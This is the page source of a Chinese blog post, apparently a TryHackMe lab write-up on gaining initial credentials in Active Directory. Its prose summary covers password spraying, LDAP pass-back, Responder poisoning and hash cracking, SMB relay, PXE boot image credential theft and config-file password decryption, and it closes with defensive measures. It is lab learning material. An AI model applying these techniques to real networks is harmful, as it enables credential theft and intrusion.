<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>THM-入侵AD | hybcx</title><meta name="keywords" content="TryHackMe"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="THM-入侵AD"><meta name="application-name" content="THM-入侵AD"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="THM-入侵AD"><meta property="og:url" content="http://hybcx.xyz/2024/02/09/thm-ru-qin-ad/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 简介 大约 90% 的全球财富 1000 强公司使用 Active Directory (AD)。如果一个组织的资产使用 Microsoft Windows，那么您几乎肯定会找到 AD。 Microsoft AD 是用于管理 Windows 域网络的主导套件。然而，由于AD用于整个产业的身"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 简介 大约 90% 的全球财富 1000 强公司使用 Active Directory (AD)。如果一个组织的资产使用 Microsoft Windows，那么您几乎肯定会找到 AD。 Microsoft AD 是用于管理 Windows 域网络的主导套件。然而，由于AD用于整个产业的身"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/02/09/thm-ru-qin-ad/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'THM-入侵AD',
  postAI: '',
  pageFillDescription: '0x01 简介, Breaching Active Directory, Learning Objectives, 0x02 OSINT 和网络钓鱼, OSINT 开源情报, Phishing, 0x03 NTLM 验证服务, NTLM and NetNTLM, 暴力登录攻击, 0x04 LDAP 绑定凭证, LDAP, LDAP 回传攻击, 执行 LDAP 回传, 托管恶意 LDAP 服务器, 捕获 LDAP 凭证, 0x05 身份验证中继, 服务器消息块, LLMNR NBT-NS and WPAD, 拦截 NetNTLM 挑战, NTLM 密码喷射攻击, 传递挑战, 0x06 Microsoft 部署工具包, MDT and SCCM, PXE Boot, PXE Boot Image Retrieval, 从 PXE 启动映像恢复凭证, 0x07 配置文件, 配置文件凭证, 0x08 总结, 防御措施简介大约的全球财富强公司使用如果一个组织的资产使用那么您几乎肯定会找到是用于管理域网络的主导套件然而由于用于整个产业的身份和访问管理它掌握着王国的钥匙使其很可能成为攻击者的目标在我们利用错误配置进行权限提升横向移动和目标执行之前您首先需要初始访问权限您需要获取一组初始的有效凭据由于服务和功能的数量众多获取一组初始凭据的攻击面通常很大在这个房间里我们将讨论几种途径但这绝不是详尽的列表在查找第一组凭据时我们不会关注与帐户关联的权限而是关注与帐户相关的权限因此即使是低权限帐户也足够了我们只是在寻找一种对进行身份验证的方法使我们能够对本身进行进一步的枚举在这个网络中我们将介绍几种可用于入侵的方法这绝不是完整的列表因为每天都会发现新的方法和技术但是我们将介绍以下技术来恢复此网络中的凭据认证服务绑定凭证认证中继微软部署工具包配置文件我们可以通过针对面向互联网的组织的系统或通过在组织的网络上植入恶意设备来使用这些技术进行安全评估和网络钓鱼获取第一组凭据的两种流行方法是开源情报和网络钓鱼我们在这里仅简单提及这两种方法因为它们已经在其他房间中进行了更深入的介绍开源情报用于发现已公开披露的信息就凭据而言发生这种情况的原因有多种例如在等公共论坛上提问但在问题中披露敏感信息例如凭据的用户使用硬编码凭据将脚本上传到等服务的开发人员由于员工使用其工作帐户注册其他外部网站因此在过去的违规行为中凭证被泄露和等网站提供了出色的平台可以确定某人的信息例如工作电子邮件是否曾经涉及公开的数据泄露事件通过使用技术有可能恢复公开披露的凭据如果我们足够幸运找到凭证我们仍然需要找到一种方法来测试它们是否有效因为信息可能会过时在任务中我们将讨论身份验证服务它可能提供一个极好的途径来测试凭据以查看它们是否仍然有效可以在此处找到有关红队的详细房间网络钓鱼是另一种破坏的绝佳方法网络钓鱼通常会诱使用户在恶意网页上提供凭据或要求他们运行特定的应用程序该应用程序会在后台安装远程访问特洛伊木马这是一种流行的方法因为会在用户的上下文中执行从而立即允许您模拟该用户的帐户这就是为什么网络钓鱼对于红队和蓝队来说都是一个大话题可以在此处找到有关网络钓鱼的详细信息验证服务新技术管理器是一套用于在中验证用户身份的安全协议可用于通过使用称为的基于质询响应的方案进行身份验证这种身份验证机制被网络上的服务大量使用但是使用的服务也可以暴露在互联网上以下是一些流行的例子公开登录门户的内部托管邮件服务器暴露于互联网的服务器的远程桌面协议服务与集成的公开端点面向互联网并使用的应用程序通常也称为身份验证或身份验证允许应用程序扮演客户端和之间的中间人的角色所有身份验证材料都以质询的形式转发到域控制器如果成功完成应用程序将对用户进行身份验证这意味着应用程序代表用户进行身份验证而不是直接在应用程序本身上对用户进行身份验证这可以防止应用程序存储凭据该凭据应仅存储在域控制器上这个过程如下图所示暴力登录攻击如任务中所述这些公开的服务提供了一个极好的位置来测试使用其他方式发现的凭据但是也可以直接使用这些服务来尝试恢复一组初始的有效凭据如果我们在最初的红队侦察期间恢复了有效电子邮件地址等信息我们也许可以尝试使用它们进行暴力攻击由于大多数环境都配置了帐户锁定因此我们无法运行完整的暴力攻击相反我们需要执行密码喷射攻击我们不会尝试多个不同的密码这可能会触发帐户锁定机制而是选择并使用一个密码并尝试使用我们获得的所有用户名进行身份验证但是应该注意的是由于这些类型的攻击将生成大量失败的身份验证尝试因此可以检测到这些类型的攻击您已获得在红队练习中发现的用户名列表活动还显示了该组织的初始入职密码似乎是尽管用户应始终更改其初始密码但我们知道用户经常忘记我们将使用定制开发的脚本对托管在以下的应用程序进行密码喷射导航到我们可以看到它提示我们输入身份验证凭据注意的身份验证插件非常容易失败如果您想手动测试凭据建议使用我们可以使用等工具来协助密码喷射攻击然而通常最好自己编写这些类型的攻击脚本这样您就可以更好地控制该过程任务文件中提供了一个基本的脚本可用于密码喷射攻击以下函数是脚本的主要组成部分此函数将我们建议的密码和我们定位的作为输入并尝试使用文本文件中的每个用户名对进行身份验证通过监控应用程序的响应代码的差异我们可以确定凭证对是否有效如果凭证对有效应用程序将使用代码进行响应如果该对无效应用程序将返回未经授权代码按照提示我们运行脚本如下图共发现四个有效凭据绑定凭证应用程序可以使用的另一种身份验证方法是轻量级目录访问协议身份验证身份验证与身份验证类似但是通过身份验证应用程序可以直接验证用户的凭据该应用程序有一对凭据可以首先使用它们来查询然后验证用户的凭据身份验证是与集成的第三方非应用程序的一种流行机制其中包括应用程序和系统例如如果这些应用程序或服务中的任何一个在互联网上暴露那么可以使用与针对认证系统使用的相同类型的攻击但是由于使用认证的服务需要一组凭据因此它会打开额外的攻击途径本质上我们可以尝试恢复服务使用的凭据以获得对的认证访问权限通过进行身份验证的过程如下所示如果您可以在正确的主机例如服务器上站稳脚跟那么恢复这些凭据可能就像读取配置文件一样简单这些凭证通常以纯文本形式存储在配置文件中因为安全模型依赖于保持位置和存储配置文件的安全而不是其内容的安全任务中更深入地介绍了配置文件回传攻击然而可以针对身份验证机制执行另一种非常有趣的攻击称为回传攻击当您获得对内部网络的初始访问权限例如在会议室中插入恶意设备时这是针对网络设备例如打印机的常见攻击当我们访问指定参数的设备配置时可以执行回传攻击例如这可以是网络打印机的界面通常这些接口的凭据保留为默认凭据例如或在这里我们无法直接提取凭据因为密码通常是隐藏的但是我们可以更改配置例如服务器的或主机名在回传攻击中我们可以将此修改为我们的然后测试配置这将强制设备尝试对我们的恶意设备进行身份验证我们可以拦截此身份验证尝试以恢复凭据执行回传该网络中有一台网络打印机管理网站甚至不需要凭据导航至以查找打印机的设置页面使用浏览器检查我们还可以验证打印机网站是否至少足够安全而不仅仅是将密码发送回浏览器所以我们有用户名但没有密码但是当我们按测试设置时我们可以看到向域控制器发出身份验证请求以测试凭据让我们尝试利用此漏洞让打印机连接到我们这会泄露凭据为此我们使用一个简单的侦听器来测试是否可以让打印机连接到我们由于的默认端口是我们可以使用以下命令您应该看到我们恢复了连接但有一个小问题您可能需要多次尝试才能接收回连接但它应该会在秒内做出响应响应告诉我们遇到了问题本质上在打印机发送凭据之前它会尝试协商身份验证方法详细信息它将使用此协商来选择打印机和服务器都支持的最安全的身份验证方法如果身份验证方法太安全则凭据将不会以明文形式传输对于某些身份验证方法凭据根本不会通过网络传输所以我们不能只使用普通的来获取凭据我们需要创建一个恶意服务器并对其进行不安全的配置以确保凭证以明文形式发送托管恶意服务器有多种方法可以托管恶意服务器但我们将在本示例中使用如果您使用则已经为您安装了但是如果您使用自己的攻击机器则需要使用以下命令安装然而您还必须在攻击机上配置您自己的恶意服务器我们将首先使用以下命令重新配置服务器如果您想跳过服务器配置请确保在请求时按否具体配置参考在使用恶意服务器之前我们需要通过降级支持的身份验证机制来使其容易受到攻击我们希望确保我们的服务器仅支持和身份验证方法为此我们需要创建一个新的文件并使用以下内容进行调用该文件具有以下属性指定安全属性禁用支持匿名登录的机制指定可接受的最小安全强度表示无保护现在我们可以使用文件来修补我们的服务器方法如下我们可以使用以下命令验证我们的恶意服务器的配置是否已应用注意如果您使用您可能不会收到任何输出但配置应该已生效您可以继续执行后续步骤捕获凭证我们的恶意服务器现已配置完毕当我们单击上的测试设置时身份验证将以明文形式进行如果您正确配置了恶意服务器并且它正在降级通信您将收到以下错误此专有名称包含无效语法如果收到此错误您可以使用以下命令使用来捕获凭据另请注意是一个示例您的服务密码将会不同在返回数据之前您可能需要按几次测试设置按钮因为我们是通过连接执行攻击现在我们有了另一组有效的凭据通过使用回传攻击并降级支持的身份验证机制我们可以拦截明文形式的凭据身份验证中继继续讨论可以从我们的恶意设备发起的攻击我们现在将研究针对更广泛的网络身份验证协议的攻击在网络中有大量的服务相互通信允许用户利用网络提供的服务这些服务必须使用内置的身份验证方法来验证传入连接的身份在任务中我们探索了应用程序上使用的身份验证在此任务中我们将更深入地了解从网络角度来看此身份验证的情况但是对于此任务我们将重点关注使用的身份验证服务器消息块服务器消息块协议允许客户端如工作站与服务器如文件共享进行通信在使用的网络中负责管理从网络间文件共享到远程管理的所有事务即使当您尝试打印文档时计算机收到的缺纸警报也是协议的作用然而早期版本的协议安全性被认为是不足的发现了几个漏洞和利用方式可以利用它们来恢复凭据甚至在设备上获得代码执行尽管这些漏洞中的一些已在协议的更新版本中得到解决但通常组织并不强制使用更新版本因为旧系统不支持它们我们将研究两种不同的利用方式用于的身份验证由于可以被拦截我们可以使用离线破解技术来恢复与相关的密码然而这种破解过程比直接破解哈希要慢得多我们可以使用我们的恶意设备进行中间人攻击中继客户端和服务器之间的身份验证这将为我们提供一个活动的已验证会话和对目标服务器的访问在此任务中我们将稍微了解一下使用期间发生的身份验证我们将使用尝试拦截挑战来破解它网络上通常有很多这样的挑战一些安全解决方案甚至扫描整个范围以从主机恢复信息有时由于记录过时这些身份验证挑战最终可能会攻击您的恶意设备而不是目标主机允许我们通过在身份验证期间毒害响应来执行中间人攻击欺骗客户端与您而不是他们想要连接的实际服务器进行对话在真实上响应程序将尝试毒害检测到的任何链路本地多播名称解析名称服务和代理自动发现请求在大型网络上这些协议允许主机为同一本地网络上的所有主机执行自己的本地解析主机可以首先尝试通过发送请求并查看是否有主机响应来确定它们正在查找的主机是否位于同一本地网络上而不是使服务器等网络资源负担过重是的先驱协议发出请求是为了尝试为未来的连接找到代理由于这些协议依赖于在本地网络上广播的请求因此我们的恶意设备也会收到这些请求通常这些请求会被简单地丢弃因为它们不是针对我们的主机的然而响应者将主动侦听请求并发送有毒响应告诉请求主机我们的与请求的主机名相关联通过毒害这些请求尝试强制客户端连接到我们的在同一行中它开始托管多个服务器例如等以捕获这些请求并强制进行身份验证拦截挑战需要注意的一件事是实质上试图通过毒害连接来赢得竞争条件以确保您拦截连接这意味着响应程序通常仅限于本地网络上的中毒身份验证质询由于我们通过连接到网络因此我们只能破坏该网络上发生的身份验证质询为此我们模拟了一个可能中毒的身份验证请求每分钟运行一次这意味着您可能需要等待一段时间才能拦截质询和响应尽管在从连接到组织的恶意设备执行时能够拦截和毒害更多身份验证请求但了解这种行为可能具有破坏性并因此被检测到至关重要通过中毒身份验证请求正常的网络身份验证尝试将失败这意味着用户和服务将无法连接到他们想要连接的主机和共享在安全评估中使用时请记住这一点已安装在上但是如果您不使用则可以从此存储库下载并安装它我们将设置在连接到的接口上运行如果您使用则并非所有响应程序服务都能够启动因为其他服务已在使用这些端口但是这不会影响此任务现在将侦听任何传入的或请求我们会让在真实上运行一段时间然而在我们的例子中我们必须通过让其中一台服务器尝试对上的计算机进行身份验证来模拟这种中毒让运行一段时间平均分钟呼吸一下新鲜空气您应该会收到一个连接可以使用该连接来吸引和提取响应它看起来像这样密码喷射攻击如果我们使用恶意设备我们可能会运行相当长的时间捕获多个响应一旦我们有了几个我们就可以开始对响应执行一些离线破解希望恢复它们关联的密码如果账户配置了弱密码我们就有很大的机会成功破解它们将哈希复制到文本文件然后我们将使用可下载文件中提供的密码列表来执行此任务并使用尝试使用以下命令破解哈希密码文件已在的目录中或作为可下载的任务文件提供给您我们使用它与的相对应如果您使用自己的机器则必须先安装我们可以破解的任何哈希现在都将为我们提供用于违规的凭据传递挑战然而在某些情况下我们可以更进一步尝试传递挑战而不是直接捕获挑战如果事先不了解帐户则执行此操作会有点困难因为此攻击取决于关联帐户的权限我们需要做一些对我们有利的事情应禁用或启用签名但不强制执行当我们执行中继时我们会对请求进行微小的更改以将其传递如果启用了签名我们将无法伪造消息签名这意味着服务器会拒绝它关联的帐户需要服务器上的相关权限才能访问所请求的资源理想情况下我们希望中继具有服务器管理权限的帐户的质询和响应因为这将使我们能够在主机上立足由于我们在技术上还没有立足点因此需要对哪些帐户对哪些主机拥有权限进行一些猜测如果我们已经违反了我们可以先执行一些初始枚举这通常是这种情况这就是盲接通常不流行的原因理想情况下您首先使用另一种方法破坏然后执行枚举以确定与您所破坏的帐户关联的权限从这里您通常可以执行横向移动以跨域进行权限升级不过从根本上了解一下中继攻击的工作原理还是很好的如下图所示如果您想实际尝试这种类型的攻击请前往我们也会在以后的广告室中再次讨论这一点首先执行十分钟左右得到如下响应赋值其中的值到文件中接着进行破解一分钟左右得到结果箭头处为密码部署工具包大型组织需要工具来部署和管理资产的基础设施在大型组织中您无法让人员使用甚至闪存驱动器在每台计算机上安装软件幸运的是微软已经提供了管理资产所需的工具然而我们也可以利用这些工具中的错误配置来破坏部署工具包是一项服务可帮助自动部署操作系统大型组织使用等服务来帮助更有效地在其资产中部署新映像因为可以在中央位置维护和更新基础映像通常与的系统中心配置管理器集成后者管理所有应用程序服务和操作系统的所有更新用于新部署从本质上讲它允许团队预配置和管理启动映像因此如果他们需要配置一台新机器他们只需要插入网线一切都会自动发生他们可以对启动映像进行各种更改例如已经安装等默认软件和组织选择的防病毒软件它还可以确保在安装第一次运行时更新新版本几乎可以被视为的扩展和老大哥软件安装后会发生什么嗯进行这种类型的补丁管理它允许团队查看整个地产中安装的所有软件的可用更新团队还可以在沙箱环境中测试这些补丁以确保它们稳定然后再将它们集中部署到所有加入域的计算机它使团队的工作变得更加轻松然而任何提供基础设施集中管理的东西例如和也可能成为攻击者的目标试图接管该资产中的大部分关键功能尽管可以通过多种方式配置但对于此任务我们将专门关注称为预启动执行环境启动的配置大型组织使用引导来允许连接到网络的新设备直接通过网络连接加载和安装操作系统可用于创建管理和托管启动映像启动通常与集成这意味着如果分配租约则允许主机请求启动映像并启动网络操作系统安装过程通信流程如下图所示执行该过程后客户端将使用连接下载启动映像我们可以将启动映像用于两个不同的目的注入权限升级向量例如本地管理员帐户以便在启动完成后获得对操作系统的管理访问权限执行密码抓取攻击以恢复安装期间使用的凭据在本任务中我们将重点关注后者我们将尝试在安装过程中恢复与服务关联的部署服务帐户以应对此密码抓取攻击此外还可以检索用于无人值守安装应用程序和服务的其他帐户由于有点挑剔我们将绕过此攻击的初始步骤我们将跳过尝试从请求和启动预配置详细信息的部分我们将手动执行该过程中此步骤的其余攻击您通过收到的有关启动预配置的第一条信息是服务器的在我们的例子中您可以从网络图中恢复该信息您收到的第二条信息是文件的名称这些文件存储与不同类型的体系结构的引导相关的信息要检索此信息您需要连接到此网站它将列出各种文件通常您将使用请求每个文件并枚举所有文件的配置不过由于时间关系我们将重点关注架构的文件复制并存储该文件的全名在本练习的其余部分中我们将使用此名称占位符因为每天都会重新生成文件及其名称每次看到此占位符时请记住将其替换为您的特定文件名另请注意如果网络刚刚启动这些文件名将仅在网络处于活动状态分钟后更新现在从恢复了初始信息眨眼我们可以枚举并检索启动映像在接下来的几个步骤中我们将使用上的连接因此请使用以下命令对此会话进行身份验证以及的密码为了确保网络的所有用户都可以使用首先使用您的用户名创建一个文件夹并将存储库复制到此文件夹中我们需要执行的第一步是使用并下载文件来读取服务器的配置比有点棘手因为我们无法列出文件相反我们发送文件请求服务器将通过连接回我们以传输文件因此我们在指定文件和文件路径时需要准确文件始终位于服务器上的目录中我们可以在会话中使用以下命令启动传输您必须使用查找现在文件已恢复我们将使用读取其内容是一个脚本可自动执行此类攻击但通常会产生不同的结果因此最好执行手动方法我们将使用的函数从文件中恢复启动映像的位置文件是映像格式的可启动映像现在我们已经知道了启动映像的位置我们可以再次使用下载该映像由于您正在下载完全可启动且已配置的映像因此此下载将需要一段时间也许在等待的时候伸伸腿喝杯水从启动映像恢复凭证现在我们已经恢复了启动映像我们可以窃取存储的凭据应该指出的是我们可以发起各种攻击我们可以注入本地管理员用户因此一旦映像启动我们就具有管理员访问权限我们可以安装映像以拥有加入域的计算机如果您有兴趣了解有关这些攻击的更多信息可以阅读本文本次练习将重点关注尝试窃取凭据的简单攻击我们将再次使用来恢复凭据但您也可以通过提取映像并查找文件通常存储这些类型的凭据来手动执行此步骤要使用从引导文件恢复凭据请运行以下命令如您所见能够恢复凭据我们现在有了另一组可以使用的凭据配置文件我们将在此网络中探索的最后一个枚举途径是配置文件假设您足够幸运造成了一次漏洞使您能够访问组织网络上的主机在这种情况下配置文件是尝试恢复凭据的绝佳探索途径根据被破坏的主机各种配置文件可能具有枚举价值应用程序配置文件服务配置文件注册表项集中部署的应用程序可以使用多个枚举脚本例如来自动执行此过程配置文件凭证但是在此任务中我们将重点关注从集中部署的应用程序恢复凭据通常这些应用程序需要一种在安装和执行阶段对域进行身份验证的方法此类应用程序的一个示例是组织可以将其用作端点检测和安全响应工具将安装期间用于连接回的凭据嵌入名为的文件中可以通过对主机的本地访问来检索和读取该数据库文件以恢复关联的服务帐户在本练习中我们将再次使用上的访问文件存储在固定位置我们可以使用将复制到我们的为了读取数据库文件我们将使用一个名为的工具我们可以使用以下命令打开数据库使用我们将选择浏览数据选项并关注表我们对第二个条目特别感兴趣重点是和字段条目记下这些条目中存储的值但是字段已加密幸运的是使用已知密钥加密该字段因此我们将使用以下旧的脚本来解密密码该脚本已作为可下载的任务文件或在上提供可以在目录中找到注意我们在这里使用的工具已经很旧了它使用并依赖于旧的加密库如果您无法让脚本在您自己的虚拟机上运行请使用不过该应用程序最近进行了更新以确保它也可以在上运行您可以在此处下载最新版本您必须解压缩文件通过向脚本提供我们的编码和加密密码该脚本将提供解密的密码现在我们再次拥有了一组凭据可用于进一步枚举这只是从配置文件恢复凭据的示例之一如果您能够在主机上站稳脚跟请务必遵循详细而完善的方法以确保从主机恢复所有战利品包括凭证和其他可以存储在配置文件中的敏感信息总结可以通过大量的攻击途径来破坏我们介绍了该网络中红队演习期间常用的一些常用方法由于攻击面的巨大人们不断发现恢复第一组凭据的新途径需要建立适当的枚举方法并不断更新它才能找到初始凭证对防御措施在防御措施方面组织可以采取一些步骤用户意识和培训网络安全链中最薄弱的环节几乎总是用户对用户进行培训让他们意识到在泄露凭证等敏感信息时应小心谨慎并且不要信任可疑电子邮件从而减少这种攻击面限制在线服务和应用程序的暴露并非所有应用程序都必须可通过访问尤其是那些支持和身份验证的应用程序相反这些应用程序应放置在可通过访问的中然后可以支持多重身份验证以增强安全性实施网络访问控制可以防止攻击者连接网络上的恶意设备然而这将需要相当多的努力因为合法设备必须被列入白名单强制执行签名通过强制执行签名不可能进行中继攻击遵循最小权限原则在大多数情况下攻击者将能够恢复一组凭据通过遵循最小特权原则特别是对于用于服务的凭证可以显着降低与这些凭证被泄露相关的风险现在我们已经突破了下一步是执行的枚举以更好地理解域结构并识别可被利用的潜在错误配置这将在下一个房间中介绍记得清除配置',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-06-10 20:49:51',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
